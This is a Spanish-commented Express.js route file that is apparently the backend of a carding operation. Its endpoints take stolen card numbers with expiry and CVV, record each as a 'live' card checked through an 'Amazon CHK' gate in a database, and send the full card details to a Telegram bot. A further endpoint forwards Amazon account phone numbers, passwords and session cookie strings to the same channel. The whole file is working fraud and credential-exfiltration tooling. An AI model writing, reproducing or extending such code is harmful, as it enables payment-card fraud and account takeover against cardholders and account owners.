// routes/telegram.js
const express = require('express');
const router = express.Router();
const { pool } = require('../database');
const { sendLiveToTelegram } = require('../bot_telegram'); // Importar función del bot

// ============================================
// ENDPOINT 1: Enviar live a Telegram
// ============================================
router.post('/send-live', async (req, res) => {
    try {
        const { username, card, result } = req.body;
        
        if (!username || !card) {
            return res.status(400).json({
                success: false,
                error: 'username y card son requeridos'
            });
        }
        
        console.log(`📤 Enviando live a Telegram para @${username}: ${card}`);
        
        // Buscar el chat_id del usuario en la base de datos
        const userResult = await pool.query(
            'SELECT id, telegram_chat_id FROM users WHERE username = $1',
            [username]
        );
        
        if (userResult.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Usuario no encontrado'
            });
        }
        
        const user = userResult.rows[0];
        
        if (!user.telegram_chat_id) {
            return res.status(400).json({
                success: false,
                error: 'El usuario no ha vinculado su Telegram. Debe escribir /start al bot primero.'
            });
        }
        
        // Formatear mensaje bonito para Telegram
        const mensaje = formatearMensajeTelegram(card, result);
        
        // Usar la función del bot para enviar el mensaje
        const envioResult = await sendLiveToTelegram(user.telegram_chat_id, mensaje);
        
        if (envioResult.success) {
            res.json({
                success: true,
                message: 'Live enviada a Telegram correctamente'
            });
        } else {
            res.status(500).json({
                success: false,
                error: envioResult.error || 'Error al enviar a Telegram'
            });
        }
        
    } catch (error) {
        console.error('❌ Error en /send-live:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================
// ENDPOINT 2: Guardar live en base de datos
// ============================================
router.post('/save-live', async (req, res) => {
    try {
        const { username, card, result } = req.body;
        
        if (!username || !card) {
            return res.status(400).json({
                success: false,
                error: 'username y card son requeridos'
            });
        }
        
        console.log(`💾 Guardando live en BD para @${username}: ${card}`);
        
        // Buscar el ID del usuario
        const userResult = await pool.query(
            'SELECT id FROM users WHERE username = $1',
            [username]
        );
        
        if (userResult.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Usuario no encontrado'
            });
        }
        
        const userId = userResult.rows[0].id;
        
        // Extraer datos de la tarjeta
        const partes = card.split('|');
        if (partes.length !== 4) {
            return res.status(400).json({
                success: false,
                error: 'Formato de tarjeta inválido. Debe ser: numero|mes|año|cvv'
            });
        }
        
        const [numero, mes, año, cvv] = partes;
        const card_last_four = numero.slice(-4);
        const card_bin = numero.slice(0, 6);
        
        // Determinar tipo de tarjeta por el BIN
        let card_type = 'unknown';
        if (numero.startsWith('4')) {
            card_type = 'visa';
        } else if (numero.startsWith('5')) {
            card_type = 'mastercard';
        } else if (numero.startsWith('3')) {
            card_type = 'amex';
        }
        
        // Verificar si ya existe esta live para este usuario
        const existCheck = await pool.query(
            'SELECT id FROM user_lives WHERE user_id = $1 AND card_full = $2',
            [userId, card]
        );
        
        if (existCheck.rows.length > 0) {
            return res.json({
                success: true,
                message: 'Live ya existente en la base de datos',
                live_id: existCheck.rows[0].id
            });
        }
        
        // Insertar la live en la tabla user_lives
        const insertResult = await pool.query(
            `INSERT INTO user_lives 
             (user_id, card_full, card_last_four, card_bin, card_type, 
              gate_name, check_date, status, phase, notes)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
             RETURNING id`,
            [
                userId,
                card,
                card_last_four,
                card_bin,
                card_type,
                result?.gate || 'Amazon CHK',
                new Date().toISOString().split('T')[0],
                'live',
                'pending',
                `Live obtenida de Amazon. ${result?.message || ''}`
            ]
        );
        
        const liveId = insertResult.rows[0].id;
        
        // Crear acción automática de "live obtenida"
        await pool.query(
            `INSERT INTO live_actions 
             (live_id, user_id, action_type, page_name, response_text, action_date, notes)
             VALUES ($1, $2, $3, $4, $5, $6, $7)`,
            [
                liveId,
                userId,
                'live_obtained',
                'Amazon',
                result?.original_status || 'LIVE',
                new Date().toISOString().split('T')[0],
                `Live verificada en Amazon. ${result?.message || ''}`
            ]
        );
        
        // Actualizar contador de lives del usuario
        await pool.query(
            'UPDATE users SET total_lives = total_lives + 1 WHERE id = $1',
            [userId]
        );
        
        res.json({
            success: true,
            message: 'Live guardada exitosamente',
            live_id: liveId
        });
        
    } catch (error) {
        console.error('❌ Error en /save-live:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Función auxiliar para formatear mensaje de Telegram
function formatearMensajeTelegram(card, result) {
    const partes = card.split('|');
    const numero = partes[0];
    const mes = partes[1];
    const año = partes[2];
    const cvv = partes[3];
    
    const numeroFormateado = numero.replace(/(.{4})/g, '$1 ').trim();
    const bin = numero.slice(0, 6);
    const ultimos4 = numero.slice(-4);
    
    let mensaje = `🎯 *¡LIVE ENCONTRADA!* 🎯\n\n`;
    mensaje += `💳 *Tarjeta:* \`${numeroFormateado}\`\n`;
    mensaje += `📅 *Fecha:* ${mes}/${año}\n`;
    mensaje += `🔐 *CVV:* ${cvv}\n`;
    mensaje += `🔢 *BIN:* ${bin}\n`;
    mensaje += `🔄 *Últimos 4:* ${ultimos4}\n\n`;
    
    if (result) {
        mensaje += `📊 *Resultado:* ${result.original_status || result.status || 'LIVE'}\n`;
        if (result.message) {
            mensaje += `📝 *Detalle:* ${result.message}\n`;
        }
    }
    
    mensaje += `\n⏰ *Hora:* ${new Date().toLocaleString()}\n`;
    mensaje += `🛒 *Gate:* Amazon CHK\n`;
    mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `@C1ber7errorist4sBot`;
    
    return mensaje;
}

// ============================================
// ENDPOINT 3: Enviar cookie a Telegram
// ============================================
router.post('/send-cookie', async (req, res) => {
    try {
        const { username, phone, password, cookieString, country } = req.body;
        
        if (!username || !phone || !password || !cookieString) {
            return res.status(400).json({
                success: false,
                error: 'Faltan datos: username, phone, password, cookieString son requeridos'
            });
        }
        
        console.log(`📤 Enviando cookie a Telegram para @${username}`);
        
        // Buscar el chat_id del usuario en la base de datos
        const userResult = await pool.query(
            'SELECT id, telegram_chat_id FROM users WHERE username = $1',
            [username]
        );
        
        if (userResult.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Usuario no encontrado'
            });
        }
        
        const user = userResult.rows[0];
        
        if (!user.telegram_chat_id) {
            return res.status(400).json({
                success: false,
                error: 'El usuario no ha vinculado su Telegram. Debe escribir /start al bot primero.'
            });
        }
        
        // Formatear mensaje bonito para Telegram
        const mensaje = formatearMensajeCookie(phone, password, cookieString, country);
        
        // Usar la función del bot para enviar el mensaje
        const { sendLiveToTelegram } = require('../bot_telegram');
        const envioResult = await sendLiveToTelegram(user.telegram_chat_id, mensaje);
        
        if (envioResult.success) {
            res.json({
                success: true,
                message: 'Cookie enviada a Telegram correctamente'
            });
        } else {
            res.status(500).json({
                success: false,
                error: envioResult.error || 'Error al enviar a Telegram'
            });
        }
        
    } catch (error) {
        console.error('❌ Error en /send-cookie:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Función auxiliar para formatear mensaje de cookie
function formatearMensajeCookie(phone, password, cookieString, country = 'MX') {
    const flag = country === 'MX' ? '🇲🇽' : '🌍';
    
    let mensaje = `🍪 *¡NUEVA COOKIE AMAZON GENERADA!* 🍪\n\n`;
    mensaje += `📞 *Teléfono:* \`${phone}\`\n`;
    mensaje += `🔑 *Contraseña:* \`${password}\`\n`;
    mensaje += `🌎 *País:* ${flag} ${country}\n\n`;
    mensaje += `🍪 *Cookie String:*\n\`\`\`\n${cookieString}\n\`\`\`\n\n`;
    mensaje += `⏰ *Generada:* ${new Date().toLocaleString()}\n`;
    mensaje += `🛒 *Servicio:* Amazon Cookie Generator\n`;
    mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
    mensaje += `@C1ber7errorist4sBot`;
    
    return mensaje;
}

module.exports = router;